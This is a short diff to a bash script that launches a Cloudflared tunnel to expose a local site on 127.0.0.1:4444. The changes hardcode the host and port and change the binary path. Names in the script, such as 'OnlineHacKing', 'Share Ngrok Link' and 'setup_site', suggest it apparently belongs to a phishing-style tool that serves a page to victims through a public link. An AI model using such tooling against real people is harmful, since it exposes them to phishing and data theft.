@@ -19,14 +19,14 @@ wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudfla
 
 ## Start Cloudflared
 start_cloudflared() { 
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+        sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner_small; }
@@ -129,7 +129,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            echo ""
 			   echo ""
                            echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
-                           start_cloudflared;;
+                           { echo; start_cloudflared; }
 			   echo ""
 			   
                            if [[ -e OnlineHacking.txt ]]; then
